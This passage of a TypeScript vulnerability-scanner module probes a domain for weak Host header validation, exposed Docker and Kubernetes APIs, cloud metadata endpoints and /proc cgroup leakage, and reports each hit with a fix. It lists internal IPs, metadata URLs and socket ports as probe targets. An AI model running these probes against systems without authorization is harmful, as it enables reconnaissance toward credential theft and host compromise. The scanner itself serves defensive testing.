              `The GraphQL endpoint at ${endpoint} accepts complex alias queries without depth or cost limiting.`,
              Severity.MEDIUM,
              'Modern Attack',
              domain,
              `Endpoint: ${endpoint}, 10 aliases processed in single query`,
              'Alias-based attacks amplify query complexity, causing excessive database load and potential DoS',
              'Implement query depth limits, cost analysis, and alias count restrictions',
              ['https://portswigger.net/web-security/graphql']
            ));
          }
        }
      } catch {}

      // If we found the GraphQL endpoint, no need to test others
      break;
    }
  } catch (e) { errors.push(`GraphQL: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: DNS Rebinding ───

async function testDnsRebinding(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'DNSRebinding', baseUrl, 'Testing DNS rebinding via Host header validation bypass');
  try {
    // Test with raw IP address in Host header
    try {
      const res = await safeRequest(baseUrl, 'GET', { Host: '127.0.0.1' }, '');
      if (res.statusCode === 200 && res.body.length > 0) {
        findings.push(generateFinding(
          'DNS Rebinding - IP Address in Host Header',
          'The server responds to requests with an IP address in the Host header, indicating weak Host header validation.',
          Severity.MEDIUM,
          'Modern Attack',
          domain,
          'Host: 127.0.0.1 accepted, server returned 200',
          'DNS rebinding attacks can trick browsers into sending requests to internal services via DNS resolution manipulation',
          'Validate Host header against a whitelist of allowed hostnames; reject raw IP addresses',
          ['https://portswigger.net/web-security/dns-rebinding']
        ));
      }
    } catch {}

    // Test with internal IP in Host header
    try {
      const internalIps = ['10.0.0.1', '172.16.0.1', '192.168.1.1', '169.254.169.254'];
      for (const ip of internalIps) {
        const res = await safeRequest(baseUrl, 'GET', { Host: ip }, '');
        if (res.statusCode === 200 && res.body.length > 0) {
          findings.push(generateFinding(
            'DNS Rebinding - Internal IP in Host Header',
            `The server responds to requests with an internal IP (${ip}) in the Host header.`,
            Severity.MEDIUM,
            'Modern Attack',
            domain,
            `Host: ${ip} accepted, server returned 200`,
            'Accepting internal IPs in Host header enables DNS rebinding to access internal services',
            'Validate Host header against a strict allowlist; reject private/internal IP ranges',
            ['https://portswigger.net/web-security/dns-rebinding']
          ));
          break;
        }
      }
    } catch {}

    // Test Host header against DNS resolution
    try {
      const randomSubdomain = `rebind-test-${Date.now()}.${domain}`;
      const res = await safeRequest(baseUrl, 'GET', { Host: randomSubdomain }, '');
      if (res.statusCode === 200 && res.body.length > 0) {
        findings.push(generateFinding(
          'DNS Rebinding - Host Header Not Validated Against DNS',
          `The server accepts any Host header value (${randomSubdomain}) without validating it matches the DNS record.`,
          Severity.MEDIUM,
          'Modern Attack',
          domain,
          `Host: ${randomSubdomain} accepted, server returned 200`,
          'If the server does not validate Host against DNS, DNS rebinding can redirect browser requests to attacker-controlled IPs',
          'Validate Host header matches the expected hostname; use DNS pinning; implement CSP frame-ancestors',
          ['https://portswigger.net/web-security/dns-rebinding']
        ));
      }
    } catch {}
  } catch (e) { errors.push(`DNSRebinding: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Container Escape Indicators ───

async function testContainerEscape(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('modernAttacks', 'Container', baseUrl, 'Checking for container escape indicators and exposed orchestration endpoints');
  try {
    // Docker socket exposure
    try {
      const dockerEndpoints = ['http://localhost:2375/version', 'http://127.0.0.1:2375/version', 'http://localhost:2376/version', 'http://127.0.0.1:2376/version'];
      for (const endpoint of dockerEndpoints) {
        const res = await safeRequest(endpoint, 'GET', {}, '');
        if (res.statusCode === 200 && (res.body.includes('ApiVersion') || res.body.includes('Version') || res.body.includes('docker'))) {
          findings.push(generateFinding(
            'Docker Socket Exposed',
            `The Docker API is accessible at ${endpoint}, allowing container escape and host compromise.`,
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Docker API responded: ${res.body.substring(0, 100)}`,
            'Exposed Docker sockets allow attackers to create privileged containers and escape to the host',
            'Never expose Docker sockets to the network; use Docker socket proxying with ACLs; implement network segmentation',
            ['https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html']
          ));
          break;
        }
      }
    } catch {}

    // Kubernetes API server exposure
    try {
      const k8sEndpoints = ['https://10.0.0.1:6443/version', 'https://kubernetes.default.svc/version', 'http://10.0.0.1:8080/version', 'https://192.168.1.1:6443/version'];
      for (const endpoint of k8sEndpoints) {
        const res = await safeRequest(endpoint, 'GET', {}, '');
        if (res.statusCode === 200 && (res.body.includes('gitVersion') || res.body.includes('major') || res.body.includes('kubernetes'))) {
          findings.push(generateFinding(
            'Kubernetes API Server Exposed',
            `The Kubernetes API server is accessible at ${endpoint}, allowing cluster compromise.`,
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, K8s API responded: ${res.body.substring(0, 100)}`,
            'Exposed Kubernetes API allows attackers to deploy pods, access secrets, and escape to nodes',
            'Restrict API server access to authorized networks; use RBAC; disable anonymous authentication',
            ['https://kubernetes.io/docs/reference/access-authn-authz/controlling-accesses/']
          ));
          break;
        }
      }
    } catch {}

    // Container metadata endpoint access
    try {
      const metadataEndpoints = [
        'http://169.254.169.254/latest/meta-data/',
        'http://metadata.google.internal/computeMetadata/v1/',
        'http://169.254.169.254/metadata/instance',
      ];
      for (const endpoint of metadataEndpoints) {
        const res = await safeRequest(endpoint, 'GET', { 'Metadata-Flavor': 'Google' }, '');
        if (res.statusCode === 200 && res.body.length > 10) {
          findings.push(generateFinding(
            'Container Metadata Endpoint Accessible',
            `The cloud metadata endpoint ${endpoint} is accessible, exposing instance credentials and configuration.`,
            Severity.CRITICAL,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Metadata responded: ${res.body.substring(0, 100)}`,
            'Metadata endpoints can leak IAM credentials, API keys, and instance configuration for privilege escalation',
            'Use IMDSv2; block metadata endpoints with network policies; restrict pod access to metadata',
            ['https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html']
          ));
          break;
        }
      }
    } catch {}

    // /proc/self/cgroup leakage
    try {
      const cgroupEndpoints = ['/proc/self/cgroup', '/proc/1/cgroup', '/proc/self/status'];
      for (const endpoint of cgroupEndpoints) {
        const res = await safeRequest(`${baseUrl}${endpoint}`, 'GET', {}, '');
        if (res.statusCode === 200 && (res.body.includes('docker') || res.body.includes('kubepods') || res.body.includes('lxc') || res.body.includes('containerd'))) {
          findings.push(generateFinding(
            'Container cgroup Information Leakage',
            `The application exposes ${endpoint}, revealing container runtime and orchestration details.`,
            Severity.LOW,
            'Modern Attack',
            domain,
            `Endpoint: ${endpoint}, Response contains container identifiers: ${res.body.substring(0, 100)}`,
            'Container metadata leakage helps attackers fingerprint the runtime and identify escape vectors',
            'Block access to /proc and /sys endpoints; implement network segmentation; use seccomp profiles',
            ['https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html']
          ));
          break;
        }
      }
    } catch {}
  } catch (e) { errors.push(`Container: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MAIN MODULE ENTRY ───

export async function runModernAttacksScan(domain: string): Promise<ScanResult> {
  const startTime = Date.now();
  const findings: Finding[] = [];
  const errors: string[] = [];
  const baseUrl = `https://${domain}`;

  // Run all test modules in parallel batches
  const batch1 = Promise.all([
    testJwtAttacks(domain, baseUrl, findings, errors),
    testOAuth(domain, baseUrl, findings, errors),
    testSmuggling(domain, baseUrl, findings, errors),
  ]);

  const batch2 = Promise.all([
    testIdor(domain, baseUrl, findings, errors),
    testGraphqlSecurity(domain, baseUrl, findings, errors),
    testDnsRebinding(domain, baseUrl, findings, errors),
  ]);

  const batch3 = Promise.all([
    testContainerEscape(domain, baseUrl, findings, errors),
  ]);

  await Promise.all([batch1, batch2, batch3]);

  return {
    module: 'advancedAttacks',
    findings,
    duration: Date.now() - startTime,
    errors,
  };
}
